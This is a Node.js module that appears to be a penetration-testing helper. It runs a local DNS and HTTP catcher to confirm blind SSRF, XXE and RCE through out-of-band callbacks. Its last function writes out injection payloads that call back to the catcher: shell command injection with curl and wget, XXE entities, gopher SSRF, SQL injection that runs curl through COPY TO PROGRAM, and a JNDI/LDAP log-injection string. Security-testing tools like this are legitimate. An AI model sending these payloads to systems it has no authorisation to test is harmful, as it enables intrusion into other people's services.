/**
 * OOB collaborator local — DNS+HTTP catcher para confirmar SSRF/XXE/RCE blind.
 */

import http from 'node:http';
import dgram from 'node:dgram';
import crypto from 'node:crypto';

function newToken() {
  return crypto.randomBytes(8).toString('hex');
}

function nowIso() { return new Date().toISOString(); }

export function parseDnsQuery(buf) {
  if (!Buffer.isBuffer(buf) || buf.length < 13) return null;
  const id = buf.readUInt16BE(0);
  let off = 12;
  const labels = [];
  let safety = 0;
  while (off < buf.length && safety++ < 64) {
    const len = buf[off];
    if (len === 0) { off += 1; break; }
    if (len > 63) return null;
    if (off + 1 + len > buf.length) return null;
    labels.push(buf.slice(off + 1, off + 1 + len).toString('utf8'));
    off += 1 + len;
  }
  return { id, name: labels.join('.').toLowerCase() };
}

function buildDnsAnswer(reqBuf) {
  if (!reqBuf || reqBuf.length < 12) return Buffer.alloc(0);
  const out = Buffer.from(reqBuf);
  out[2] = out[2] | 0x80;
  out[3] = (out[3] & 0xf0) | 0x00;
  return out;
}

export async function startCatcher({
  port = 8053,
  httpPort = 8054,
  host = '127.0.0.1',
  publicHost = '127.0.0.1',
  startDns = true,
  startHttp = true,
} = {}) {
  const tokens = new Map();
  const waiters = new Map();

  function recordHit(kind, token, hit) {
    const h = { kind, at: nowIso(), ...hit };
    const slot = tokens.get(token);
    if (slot) {
      slot.hits.push(h);
      const ws = waiters.get(token) || [];
      while (ws.length) ws.shift()(slot.hits.slice());
    } else {
      const unk = tokens.get('__unknown__') || { meta: { note: 'unknown hits' }, hits: [] };
      unk.hits.push(h);
      tokens.set('__unknown__', unk);
    }
  }

  function tokenFromHost(hostHdr) {
    if (!hostHdr) return null;
    const parts = String(hostHdr).toLowerCase().split('.');
    return parts[0] && /^[a-f0-9]{16}$/.test(parts[0]) ? parts[0] : null;
  }

  function tokenFromUrl(url) {
    const m = String(url || '').match(/[?&/](?:t|token)=([a-f0-9]{16})/);
    return m ? m[1] : null;
  }

  let dnsSock = null, httpSrv = null;

  if (startDns) {
    dnsSock = dgram.createSocket('udp4');
    dnsSock.on('message', (msg, rinfo) => {
      const q = parseDnsQuery(msg);
      const tok = q ? tokenFromHost(q.name) : null;
      recordHit('dns', tok || '__unknown__', {
        query: q?.name || null, src: `${rinfo.address}:${rinfo.port}`,
      });
      try { dnsSock.send(buildDnsAnswer(msg), rinfo.port, rinfo.address); } catch {}
    });
    await new Promise((res, rej) => {
      dnsSock.once('error', rej);
      dnsSock.bind(port, host, () => res());
    });
    port = dnsSock.address().port;
  }

  if (startHttp) {
    httpSrv = http.createServer((req, res) => {
      const tok = tokenFromHost(req.headers.host) || tokenFromUrl(req.url);
      let body = '';
      req.on('data', (c) => { body += c; if (body.length > 8192) body = body.slice(0, 8192); });
      req.on('end', () => {
        recordHit('http', tok || '__unknown__', {
          method: req.method, url: req.url, host: req.headers.host,
          ua: req.headers['user-agent'], headers: redact(req.headers), body,
        });
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('ok\n');
      });
    });
    await new Promise((res, rej) => {
      httpSrv.once('error', rej);
      httpSrv.listen(httpPort, host, () => {
        httpPort = httpSrv.address().port;
        res();
      });
    });
  }

  return {
    publicHost, port, httpPort, host,
    mintToken(meta = {}) {
      const token = newToken();
      tokens.set(token, { meta: { ...meta, mintedAt: nowIso() }, hits: [] });
      return {
        token,
        dnsHost: `${token}.${publicHost}`,
        httpUrl: `http://${publicHost}:${httpPort}/?t=${token}`,
        httpsUrl: `https://${publicHost}:${httpPort}/?t=${token}`,
      };
    },
    listTokens() {
      return Array.from(tokens.entries()).map(([token, v]) => ({
        token, hits: v.hits.length, meta: v.meta,
      }));
    },
    hits(token) {
      return (tokens.get(token)?.hits || []).slice();
    },
    waitForToken(token, { timeoutMs = 15000 } = {}) {
      const slot = tokens.get(token);
      if (slot && slot.hits.length) return Promise.resolve(slot.hits.slice());
      return new Promise((res) => {
        const arr = waiters.get(token) || [];
        arr.push(res);
        waiters.set(token, arr);
        setTimeout(() => res((tokens.get(token)?.hits || []).slice()), timeoutMs);
      });
    },
    async stop() {
      try { dnsSock?.close(); } catch {}
      if (httpSrv) {
        try { await new Promise((r) => httpSrv.close(() => r())); } catch {}
      }
    },
  };
}

function redact(headers) {
  const out = {};
  for (const [k, v] of Object.entries(headers || {})) {
    if (/cookie|authorization|x-api-key|x-auth/i.test(k)) out[k] = '<redacted>';
    else out[k] = v;
  }
  return out;
}

const DOLLAR = String.fromCharCode(36);

export function buildOobPayloads({ token, host, httpPort = 8054 }) {
  const dns = `${token}.${host}`;
  const httpUrl = `http://${host}:${httpPort}/?t=${token}`;
  return {
    ssrf: [httpUrl, `http://${dns}`, `gopher://${dns}/_test`],
    xxe: [
      `<!ENTITY x SYSTEM "${httpUrl}">`,
      `<!ENTITY % p SYSTEM "${httpUrl}/dtd"> %p;`,
    ],
    rceShell: [
      `curl ${httpUrl}`, `wget ${httpUrl}`, `nslookup ${dns}`,
      `;curl ${httpUrl};`, `\`curl ${httpUrl}\``, `${DOLLAR}(curl ${httpUrl})`,
    ],
    sqliBlind: [
      `'; SELECT load_file('\\\\\\\\${dns}\\\\x'); --`,
      `'; COPY (SELECT '') TO PROGRAM 'curl ${httpUrl}'; --`,
    ],
    logInjection: [`{{ ${httpUrl} }}`, DOLLAR + '{jndi:ldap://' + dns + '/x}'],
  };
}
